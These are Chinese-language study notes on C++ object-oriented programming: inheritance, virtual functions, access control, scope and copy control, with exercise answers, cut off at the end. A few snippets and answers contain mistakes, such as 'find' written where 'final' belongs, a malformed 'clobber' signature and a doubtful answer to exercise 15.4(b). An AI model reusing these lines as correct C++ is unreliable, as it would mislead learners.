        <content type="html"><![CDATA[<h2 id="OOP：概述">OOP：概述</h2><ul><li>面向对象程序设计（object-oriented programming）的核心思想是<strong>数据抽象、继承</strong>和<strong>动态绑定</strong>。</li><li><strong>数据抽象</strong>：通过使用数据抽象，可以将类的接口和实现分离。</li><li><strong>继承</strong>（inheritance）：<ul><li>通过继承联系在一起的类构成一种层次关系。</li><li>通常在层次关系的根部有一个<strong>基类</strong>（base class）。</li><li>其他类直接或者简介从基类继承而来，这些继承得到的类成为<strong>派生类</strong>（derived class）。</li><li>基类负责定义在层次关系中所有类共同拥有的成员，而每个派生类定义各自特有的成员。</li><li>对于某些函数，基类希望它的派生类个自定义适合自己的版本，此时基类就将这些函数声明成<strong>虚函数</strong>（virtual function）。</li><li>派生类必须通过使用<strong>类派生列表</strong>（class derivation list）明确指出它是从哪个基类继承而来。形式：一个冒号，后面紧跟以逗号分隔的基类列表，每个基类前都可以有访问说明符。<code>class Bulk_quote : public Quote&#123;&#125;;</code></li><li>派生类必须在其内部对<strong>所有</strong>重新定义的虚函数进行声明。可以在函数之前加上<code>virtual</code>关键字，也可以不加。C++11新标准允许派生类<strong>显式地注明</strong>它将使用哪个成员函数改写基类的虚函数，即在函数的形参列表之后加一个<code>override</code>关键字。</li></ul></li><li><strong>动态绑定</strong>（dynamic binding，又称<strong>运行时绑定</strong>）：<ul><li>使用同一段代码可以分别处理基类和派生类的对象。</li><li><strong>函数的运行版本由实参决定，即在运行时选择函数的版本。</strong></li></ul></li></ul><h2 id="定义基类和派生类">定义基类和派生类</h2><h3 id="定义基类">定义基类</h3><ul><li><strong>基类通常都应该定义一个虚析构函数，即使该函数不执行任何实际操作也是如此。</strong></li><li>基类通过在其成员函数的声明语句前加上关键字<code>virtual</code>使得该函数执行<strong>动态绑定</strong>。</li><li><strong>任何构造函数之外的非静态函数都可以是虚函数</strong>，如果基类把一个函数声明成虚函数，则该函数在派生类中隐式的也是虚函数。</li><li><strong>如果成员函数没有被声明为虚函数，则解析过程发生在编译时而非运行时</strong>。</li><li>访问控制：<ul><li><code>protected</code> ： 基类和和其派生类还有友元可以访问。</li><li><code>private</code> ： 只有基类本身和友元可以访问。</li></ul></li></ul><h4 id="练习-15-2">练习 15.2</h4><p>Q: <code>protected</code> 访问说明符与 <code>private</code> 有何区别？</p><p>A: <code>protected</code> ： 基类和和其派生类还有友元可以访问。<br><code>private</code> ： 只有基类本身和友元可以访问。</p><h3 id="定义派生类">定义派生类</h3><ul><li><p>派生类必须通过类派生列表（class derivation list）明确指出它是从哪个基类继承而来。形式：冒号，后面紧跟以逗号分隔的基类列表，每个基类前面可以有一下三种访问说明符的一个：<code>public</code>、<code>protected</code>、<code>private</code>。</p></li><li><p>C++11新标准允许派生类显式地注明它将使用哪个成员函数改写基类的虚函数，即在函数的形参列表之后加一个<code>override</code>关键字。</p></li><li><p>派生类构造函数：<strong>派生类必须使用基类的构造函数去初始化它的基类部分。</strong></p></li><li><p>尽管在派生类对象中含有从基类继承而来的成员，但是派生类并不能直接放初始化这些成员，必须使用基类的构造函数来初始化它的基类部分。</p><blockquote><p>每个类控制它的成员初始化过程。<br>每个类负责定义各自的接口，因此派生类对象不能直接初始化基类的成员（尽管从语法上就可以在派生类构造函数体内给它的公有或受保护的基类成员赋值，但是最好不要这样，而应当遵循其接口——通过调用基类的构造函数来初始化从基类继承的成员）。</p><p>首先初始化基类的部分（可在初始化列表中显式调用对应基类的初始化列表，否则使用默认初始化），然后按照声明的顺序依次初始化派生类的成员。</p></blockquote></li><li><p>静态成员：如果基类定义了一个基类成员，则在整个继承体系中只存在该成员的唯一定义。</p></li><li><p><strong>派生类的声明：声明中不包含它的派生列表。</strong></p></li><li><p>派生类的作用域嵌套在基类的作用域内。</p></li><li><p>如果想将某个类用作基类，则该类必须已经定义而非仅仅声明。</p></li><li><p>最终的派生类将包含它的直接基类和每个间接基类的子对象，即使是<code>private</code>（会继承，只不过访问不到）。</p></li><li><p>C++11新标准提供了一种防止继承的方法，在类名后面跟一个关键字<code>final</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下两种方式均可:</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NoDrived</span> find &#123;&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Last</span> <span class="keyword">final</span> : Base &#123;&#125;;</span><br></pre></td></tr></table></figure></li></ul><h4 id="练习15-4">练习15.4</h4><p>Q: 下面哪条声明语句是不正确的？请解释原因。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123; ... &#125;;</span><br><span class="line">(a) <span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Derived &#123; ... &#125;;</span><br><span class="line">(b) <span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">private</span> Base &#123; ... &#125;;</span><br><span class="line">(c) <span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Base;</span><br></pre></td></tr></table></figure><p>A:</p><ul><li>(a) 不正确。类不能派生自身。</li><li>(b) 不正确。这是定义而非声明。</li><li>© 不正确。派生类的声明中不包含它的派生列表。</li></ul><h3 id="类型转换与继承">类型转换与继承</h3><blockquote><p>理解基类和派生类之间的类型转换是理解C++语言面向对象编程的关键所在。</p></blockquote><ul><li>可以将基类的指针或引用绑定到派生类对象上，智能指针也支持。</li><li>不存在从基类向派生类的隐式类型转换。</li><li><strong>派生类向基类的自动类型转换只对指针或引用类型有效，对象之间不存在类型转换。</strong></li><li>和其他任何成员一样，派生类向基类的类型转换也可能会由于访问受限而变得不可行。</li></ul><h4 id="练习15-8">练习15.8</h4><p>Q: 给出静态类型和动态类型的定义。</p><p>A: 表达式的静态类型在编译时总是已知的，它是变量声明时的类型或表达式生成的类型。<br>动态类型则是变量或表达式表示的内存中的对象的类型。动态类型直到运行时才可知。</p><h4 id="练习15-9">练习15.9</h4><p>Q: 在什么情况下表达式的静态类型可能与动态类型不同？</p><p>A: 基类的指针或引用的静态类型可能与其动态类型不一致。</p><h2 id="虚函数">虚函数</h2><ul><li><p>通常情况下如果不适用某个函数，则无须为该函数提供定义，但必须为每一个虚函数都提供定义，而不管它是否被使用到了，这是因为连编译器也无法确定到底会使用哪个虚函数。</p></li><li><p>使用虚函数可以执行动态绑定。</p></li><li><p>OOP的核心思想是<strong>多态性（polymorphism）</strong>。</p></li><li><p><strong>当且仅当对通过指针或引用调用虚函数时，才会在运行时解析该调用，也只有在这种情况下对象的动态类型才有可能与静态类型不同</strong>。</p></li><li><p>当使用基类的引用或指针调用一个基类中定义的一个函数时</p><ul><li>如果该函数是虚函数，则直到运行时才会决定到底执行哪个版本，判断的依据是绑定的真实类型。</li><li><strong>对非虚函数的调用在编译时进行绑定。</strong></li><li>类似的，通过对象进行的函数（虚函数或非虚函数）调用也在编译时绑定。<br>对象的类型是确定不变的，无论如何都不能让对象的动态类型与静态类型不一致。</li></ul></li><li><p>派生类必须在其内部对所有重新定义的虚函数进行声明。可以在函数之前加上<code>virtual</code>关键字，也可以不加，<strong>因为一旦某个函数被声明为虚函数，则在所有派生类中它都是虚函数</strong>。</p></li><li><p>一个派生类的函数如果覆盖了某个继承而来的虚函数，则它的形参类型必须和它覆盖掉基类函数完全一致。<br>同样，派生类中虚函数的返回类型也必须和基类函数匹配。不过该规则也有一个例外，当类的虚函数返回类型是类本身的指针或引用时，该规则无效。</p></li><li><p>如果我们想覆盖某个虚函数，但不小心把形参列表弄错了，这个时候就不会覆盖基类中的虚函数。加上<code>override</code>可以明确程序员的意图，让编译器帮忙确认参数列表是否出错。</p></li><li><p>如果虚函数使用默认实参，则基类和派生类中定义的默认实参最好一致。<br>实参值使用本次调用的静态类型。</p></li><li><p>通常，只有成员函数（或友元）中的代码才需要使用<strong>作用域运算符</strong>（<code>::</code>）来回避虚函数的机制。</p></li></ul><h4 id="练习15-14">练习15.14</h4><p>Q: 给定上一题中的类以及下面这些对象，说明在运行时调用哪个函数：</p><p>其中 <code>name</code> 为普通函数，而 <code>print</code> 为虚函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base bobj; base *bp1 = &amp;bobj; base &amp;br1 = bobj;</span><br><span class="line">derived dobj; base *bp2 = &amp;dobj; base &amp;br2 = dobj;</span><br><span class="line">(a)bobj.<span class="built_in">print</span>();(b)dobj.<span class="built_in">print</span>();(c)bp1-&gt;<span class="built_in">name</span>();</span><br><span class="line">(d)bp2-&gt;<span class="built_in">name</span>();(e)br1.<span class="built_in">print</span>();(f)br2.<span class="built_in">print</span>();</span><br></pre></td></tr></table></figure><p>A:</p><ul><li>(a) 编译时。</li><li>(b) 编译时。</li><li>© 编译时。</li><li>(d) 编译时。</li><li>(e) 运行时。<code>base::print()</code></li><li>(f) 运行时。<code>derived::print()</code></li></ul><h2 id="抽象基类">抽象基类</h2><ul><li><strong>纯虚函数</strong>（pure virtual）：清晰地告诉用户当前的函数是没有实际意义的。纯虚函数无需定义，只用在函数体的位置前书写<code>=0</code>就可以将一个虚函数说明为纯虚函数。</li><li>含有纯虚函数的类是<strong>抽象基类</strong>（abstract base class）。不能创建抽象基类的对象。</li></ul><h2 id="访问控制与继承">访问控制与继承</h2><ul><li>受保护的成员：<ul><li><p><code>protected</code>说明符可以看做是 <code>public</code> 和 <code>private</code> 中的产物。</p></li><li><p>类似于私有成员，<strong>受保护的成员对类的用户来说是不可访问的。</strong></p></li><li><p>类似于公有成员，<strong>受保护的成员对于派生类的成员和友元来说是可访问的。</strong></p></li><li><p>派生类的成员或友元只能通过<strong>派生类对象</strong>来访问基类的受保护成员。<strong>派生类对于一个基类对象中的受保护成员没有任何访问特权。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">     <span class="type">int</span> prot_mem;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sneaky</span> : <span class="keyword">public</span> Base &#123;</span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">clobber</span><span class="params">(Sneaky&amp;)</span></span>;  <span class="comment">// 能访问Sneaky::prot_mem</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">clobber</span><span class="params">(Base&amp;)</span></span>;  <span class="comment">// 不能访问Base::prot_mem</span></span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确：clobber能访问Derived对象中的private和protected成员</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clobber</span><span class="params">(Sneaky)</span> &amp;s) </span>&#123; s.j = s.prot_mem = <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误：clobber不能访问Base的protected成员</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clobber</span><span class="params">(Base &amp;b)</span> </span>&#123; b.prot_mem = <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>公有、私有和受保护继承</strong></p><ul><li><p><mark>派生访问说明符</mark></p><ul><li><p><strong>对于派生类的成员（及友元）能否访问其直接基类的成员没什么影响。</strong><br><strong>对基类成员的访问权限只与基类中的访问说明符有关。</strong></p></li><li><p>派生访问说明符的目的是：</p><ul><li><p>控制<strong>派生类用户</strong>对于基类成员的访问权限。比如<code>struct Priv_Drev: private Base&#123;&#125;</code>意味着在派生类<code>Priv_Drev</code>中，从<code>Base</code>继承而来的部分都是<code>private</code>的，那么<code>Pub_derv d2; d2.pub_mem();</code>会报错。</p></li><li><p>控制<strong>继承自派生类的新类</strong>的访问权限。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Derived_from_Private</span> : <span class="keyword">public</span> Priv_Derv &#123;</span><br><span class="line">    <span class="comment">// 错误：Base::prot_mem在Priv_Derv中是private的</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">use_base</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> prot_mem;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><p><strong>派生类向基类转换的可行性</strong></p><p>假设D继承自B:</p><ul><li>只有当D公有地继承B时，<strong>用户代码</strong>才能使用派生类向基类的转换；</li><li><strong>不论D以什么方式继承B，D的成员函数和友元都能使用派生类向基类的转换</strong>；</li><li>如果D继承B的方式是公有或者受保护的，则D的派生类的成员和友元才能使用D向B的类型转换。</li></ul><blockquote><p>关键概念：类的设计与受保护的成员</p><p>考虑类的继承，一个类有三种不同的用户：</p><ol><li>普通用户：只能访问类的公有（接口）成员。</li><li>类的实现者：负责写类的成员和友元代码，既能访问接口，又能访问实现。</li><li>派生类：基类把希望派生类能访问的部分声明成受保护的。</li></ol><p>接口成员应声明成公有的；</p><p>实现部分应分成两组：一组供派生类师访问，另一组只能由基类及基类的友元使用。</p></blockquote><p><strong>友元与继承</strong></p><ul><li><p>就像友元关系不能传递一样，友元关系也不能继承。</p><blockquote><p>每个类负责控制自己的成员的访问权限。</p><p><code>Pal</code>是<code>Base</code>的友元，所以<code>Pal</code>能够访问<code>Base</code>对象的成员，这种可访问性包括了<code>Base</code>对象内嵌在派生类对象中的情况。</p></blockquote></li></ul><p><strong>改变个别成员的可访问性</strong></p><ul><li><p>改变个别成员的可访问性：使用<code>using</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">private</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">using</span> Base::size;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">using</span> Base::n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>改变后，<code>Derived</code>的用户可以使用<code>size</code>成员，而<code>Derived</code>的派生类可以使用<code>n</code>；</li><li><strong><code>using</code>声明中名字的访问权限由该<code>using</code>声明语句之前的访问说明符来决定。</strong></li><li>派生类<strong>只能为它可以访问的名字提供<code>using</code>声明。</strong></li></ul></li><li><p><code>struct</code>和<code>class</code>唯一的区别是<strong>默认成员访问说明符</strong>及<strong>默认派生访问说明符</strong>。</p></li><li><p>默认情况下，使用<code>class</code>关键字定义的派生类是私有继承的；使用<code>struct</code>关键字定义的派生类是公有继承的。</p></li></ul><h4 id="练习15-18">练习15.18</h4><p>Q: 假设给定了第543页和第544页的类，同时已知每个对象的类型如注释所示，判断下面的哪些赋值语句是合法的。解释那些不合法的语句为什么不被允许：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Base *p = &amp;d1;  <span class="comment">//d1 的类型是 Pub_Derv</span></span><br><span class="line">p = &amp;d2;<span class="comment">//d2 的类型是 Priv_Derv</span></span><br><span class="line">p = &amp;d3;<span class="comment">//d3 的类型是 Prot_Derv</span></span><br><span class="line">p = &amp;dd1;<span class="comment">//dd1 的类型是 Derived_from_Public</span></span><br><span class="line">p = &amp;dd2;<span class="comment">//dd2 的类型是 Derived_from_Private</span></span><br><span class="line">p = &amp;dd3;<span class="comment">//dd3 的类型是 Derived_from_Protected</span></span><br></pre></td></tr></table></figure><p>A:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Base *p = &amp;d1; 合法</span><br><span class="line">p = &amp;d2; 不合法</span><br><span class="line">p = &amp;d3; 不合法</span><br><span class="line">p = &amp;dd1; 合法</span><br><span class="line">p = &amp;dd2; 不合法</span><br><span class="line">p = &amp;dd3; 不合法</span><br></pre></td></tr></table></figure><p><strong>只有在派生类是使用<code>public</code>的方式继承基类时，用户代码才可以使用派生类到基类（<code>derived-to-base</code>）的转换。</strong></p><h4 id="练习15-19">练习15.19</h4><p>Q: 假设543页和544页的每个类都有如下形式的成员函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">memfcn</span><span class="params">(Base &amp;b)</span> </span>&#123; b = *<span class="keyword">this</span>; &#125;</span><br></pre></td></tr></table></figure><p>对于每个类，分别判断上面的函数是否合法。</p><p>解：</p><p>合法：</p><ul><li>Pub_Derv</li><li>Priv_Derv</li><li>Prot_Derv</li><li>Derived_from_Public</li><li>Derived_from_Protected<br>不合法：</li><li>Derived_from_Private</li></ul><p>原因如下：</p><ol><li>无论派生类D以什么方式继承基类B，<strong>派生类D的成员函数和友元</strong>都能使用派生类向基类的转换；派生类向其直接基类的类型转换对于派生类的成员和函数来说永远是可访问的。</li><li>如果派生类D继承基类B的方式是公有的或者受保护的，则<strong>D的派生类的成员和友元</strong>可以使用派生类向基类的类型转换；反之，如果派生类继承基类的方式是私有的，则不能使用。</li></ol><h2 id="继承中的类作用域">继承中的类作用域</h2><ul><li>派生类的作用域嵌套在其基类的作用域之内。</li><li>一个对象、引用或指针的<strong>静态类型</strong>决定了该对象的哪些成员是可见的。</li></ul><p><strong>名字冲突与继承</strong></p><ul><li><p>派生类的成员将隐藏同名的基类成员。<br>和其他作用域一样，派生类也能重用定义在其直接基类或间接基类中的名字，此时内层作用域中名字将隐藏定义在外层作用域中的名字。</p><blockquote><p>区分&quot;隐藏&quot;和”覆盖“：</p><ul><li>隐藏是内层名字把外层的隐藏了，但通过作用域运算符仍然能访问到。<ul><li>二者可能只是名字一样，但参数和返回类型很可能不同。</li><li>隐藏 和 重用 对应</li></ul></li><li>覆盖是派生类重新定义名字和形参列表都相同的函数，以实现对基类虚函数的覆盖。<ul><li>形参列表必须相同——否则无法通过基类的引用或指针调用派生类的虚函数。</li><li><strong>覆盖 = 重写（override）</strong></li></ul></li></ul></blockquote></li><li><p>除了覆盖继承而来的虚函数之外，派生类最好不要重用其他定义在基类中的名字。</p></li></ul><blockquote><p>关键概念：<strong>名字查找和继承</strong></p><p>假定调用 <code>p-&gt;mem()</code> 或 <code>obj.mem()</code>，则依次执行以下4个步骤：</p><ol><li>首先确定<code>p</code>或<code>obj</code>的静态类型。</li><li>在<code>p</code>或<code>obj</code>的静态类型对应类中查找<code>mem</code>。如果找不到，就依次在直接基类中不断直至到达继承链的顶端。如果仍然找不到，则编译器将报错。</li><li>一旦找到了<code>mem</code>，就进行常规的类型检查以判断本次调用是否合法。</li><li>若调用合法，则编译器根据调用的时是否是虚函数而产生不同的代码：<ul><li>如果<code>mem</code>是虚函数，且通过<strong>引用或指针</strong>进行调用，则编译器产生的代码将在运行时确定到底运行该虚函数的哪个版本，依据是对象的动态类型。</li><li>如果<code>mem</code>不是虚函数或通过<strong>对象</strong>继续调用，则编译器将产生一个常规函数调用。</li></ul></li></ol></blockquote><p><strong>一如往常，名字查找先于类型查找</strong></p><ul><li>声明在内层作用域的函数<strong>并不会重载</strong>声明在外层作用域的函数。<br>即使派生类成员和基类成员的形参列表不一致，基类成员也仍然会被隐藏掉。<br>要调用基类成员：<code>d.Base::memfun();</code></li><li>一旦名字找到，编译器就不再继续查找。</li></ul><p><strong>虚函数与作用域</strong></p><ul><li><strong>基类和派生类中的虚函数必须拥有相同的形参列表，否则就无法通过基类的引用或指针调用派生类的虚函数。</strong></li><li>如果派生类中函数<strong>与基类中虚函数形参列表不同，则这是并非覆盖，而是派生类中此函数隐藏基类函数，二者在派生类中并存。</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">int</span> <span class="title">fcn</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D1</span> : <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">fcn</span><span class="params">(<span class="type">int</span>)</span></span>;  <span class="comment">// 隐藏基类的fcn, D1::fcn()不是虚函数</span></span><br><span class="line">    <span class="comment">// D1继承了Base::fcn()的定义</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">f2</span><span class="params">()</span></span>;  <span class="comment">// 是一个新的虚函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D2</span> : <span class="keyword">public</span> D1 &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">fcn</span><span class="params">(<span class="type">int</span>)</span></span>;  <span class="comment">// 是一个非虚函数, 隐藏了D1::fcn(int)</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">fcn</span><span class="params">()</span></span>;   <span class="comment">// 覆盖了Base中的虚函数fcn</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">f2</span><span class="params">()</span></span>;   <span class="comment">// 覆盖了D1中的虚函数f2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通过基类调用隐藏的虚函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Base bobj; D1 d1obj; D2 d2obj;</span><br><span class="line"><span class="comment">// 通过基类的指针进行</span></span><br><span class="line">Base *bp1 = &amp;bobj, *bp2 = &amp;d1obj, *bp3 = &amp;d2obj;</span><br><span class="line">bp1-&gt;<span class="built_in">fcn</span>();  <span class="comment">// 虚调用, 运行时调用Base::fcn</span></span><br><span class="line">bp2-&gt;<span class="built_in">fcn</span>();  <span class="comment">// 虚调用, 运行时调用Base::fcn</span></span><br><span class="line">bp3-&gt;<span class="built_in">fcn</span>();  <span class="comment">// 虚调用, 运行时调用D2::fcn</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过不同类型指针进行</span></span><br><span class="line">D1 *d1p = &amp;d1obj; D2 *d2p = &amp;d2obj;</span><br><span class="line">bp2-&gt;<span class="built_in">f2</span>();  <span class="comment">// 错误：Base没有f2</span></span><br><span class="line">d1p-&gt;<span class="built_in">f2</span>();  <span class="comment">// 虚调用，运行时调用D1::f2</span></span><br><span class="line">d2p-&gt;<span class="built_in">f2</span>();  <span class="comment">// 虚调用，运行时调用D2::f2</span></span><br></pre></td></tr></table></figure><p>若是<strong>针对非虚函数如<code>fcn(int)</code>的调用，则使用静态绑定。</strong></p><p><strong>覆盖重载的函数</strong></p><ul><li>如果派生类希望所有的重载版本对它来说都是可见的，那么它就需要覆盖所有版本，或者一个都不覆盖。</li><li>有时一个类仅需要覆盖重载集合中的一些而非全部函数，一种好的解决方案就是为重载的成员提供一条<code>using</code>声明语句。</li><li>一条基类的<code>using</code>声明语句就可以把该函数的所有重载实例添加到派生类的作用域中。</li></ul><h2 id="构造函数与拷贝控制">构造函数与拷贝控制</h2><h3 id="虚析构函数">虚析构函数</h3><ul><li><strong>基类通常应该定义一个虚析构函数</strong>，这样我们就能动态分配继承体系中的对象了。</li><li>和其他虚函数一样，<strong>析构函数的虚属性也会被继承</strong>。<br>只要基类的析构函数是虚函数，无论派生类使用合成的析构函数还是自定义析构函数，都是虚函数。</li><li><strong>如果基类的析构函数不是虚函数，则<code>delete</code>一个指向派生类对象的基类指针将产生未定义的行为。</strong></li></ul><p><strong>虚析构函数将阻止合成移动操作</strong></p><ul><li>如果一个类定义了析构函数，即使它通过<code>=default</code>使用了合成的版本，编译器也不会为这个类合成移动操作。<br>（当一个类显式定义了析构函数时，编译器就认为该类可能有一些特殊的资源管理需求，因此不会假定默认的移动操作是安全的，而是要求程序员自己显式地定义移动操作以确保资源管理的正确性。）</li></ul><h3 id="合成拷贝控制与继承">合成拷贝控制与继承</h3><ul><li>基类或派生类的合成拷贝控制成员的行为和其他合成的构造函数、赋值运算符或析构函数类似：他们对类本身的成员依次进行初始化、赋值或销毁的操作。<br>例如，合成的<code>Bulk_quote</code>拷贝构造函数使用合成的<code>Disc_quote</code>拷贝构造函数，而后者又使用合成的<code>Quote</code>拷贝构造函数，三者各自控制拷贝自己的成员。</li></ul><p><strong>派生类中删除的拷贝控制和基类的关系</strong>、</p><ul><li>如果基类中的默认构造函数、拷贝构造函数、拷贝赋值运算符或析构函数是被删除的或不可访问的，则派生类中对应的成员是被删除的。</li><li>如果在基类中有一个不可访问的或删除掉的析构函数，则派生类中合成的默认和拷贝构造函数将删除的。</li><li>编译器不会合成一个删除掉的操作。如果基类中移动或析构操作是删除的或不可访问的，则派生类的移动构造函数同样是被删除的。</li></ul><p><strong>移动操作和继承</strong></p><ul><li><p>大多数基类都会定义一个虚析构函数。<br><strong>因此默认情况下，基类通常不含有合成的移动操作</strong>，而且在它的派生类中也没有合成的移动操作。</p></li><li><p><strong>一旦<code>Quote</code>定义了自己的移动操作，就必须同时显示地定义拷贝操作——否则拷贝操作默认被定义为删除的。</strong></p><blockquote><p>P477：<strong>如果类定义了一个移动构造函数和/或一个移移动赋值运算符，则该类的合成拷贝函数和拷贝赋值运算符会被定义为删除的。</strong><br>（这是因为在 C++ 中，如果一个类显式定义了移动构造函数或移动赋值运算符，编译器就会认为该类可能在内部进行了资源管理或者需要特殊的移动语义。因此，为防止误用，编译器会默认删除合成的拷贝构造函数和拷贝赋值运算符。）</p></blockquote></li></ul><h3 id="派生类的拷贝控制成员">派生类的拷贝控制成员</h3><ul><li><p>当派生类定义了拷贝或移动操作时，该操作负责拷贝或移动包括基类部分成员在内的整个对象。<br>需要在派生类的构造函数初始值列表中<strong>显式使用</strong>基类的拷贝（或移动）构造函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">D</span> : <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">D</span>(<span class="type">const</span> D&amp; d): <span class="built_in">Base</span>(d) <span class="comment">/* D成员初始值*/</span>  &#123;&#125;</span><br><span class="line">    <span class="built_in">D</span>(D&amp;&amp; d): <span class="built_in">Base</span>(std::<span class="built_in">move</span>(d)) <span class="comment">/* D成员初始值*/</span> <span class="keyword">noexcept</span>  &#123;&#125;</span><br><span class="line">    D&amp; <span class="keyword">operator</span>=(<span class="type">const</span> D &amp;rhs) &#123;</span><br><span class="line">        Base::<span class="keyword">operator</span>=(rhs);</span><br><span class="line">        <span class="comment">// ... (处理自赋值、释放已有资源、为派生类成员赋值)</span></span><br><span class="line">       <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">D</span>() &#123; <span class="comment">/*清除派生类成员的操作*/</span> &#125;  <span class="comment">// Base::~Base会被自动调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Base(d)</code>一般会匹配<code>Base</code>的拷贝构造函数，<code>D</code>类型的对象<code>d</code>会被绑定到该构造函数的<code>Base&amp;</code>形参上。</p></li><li><p><strong>析构函数只负责销毁派生类自己分配的部分。</strong><br>派生类析构函数先执行，然后执行基类的析构函数（自动调用）。</p></li></ul><h3 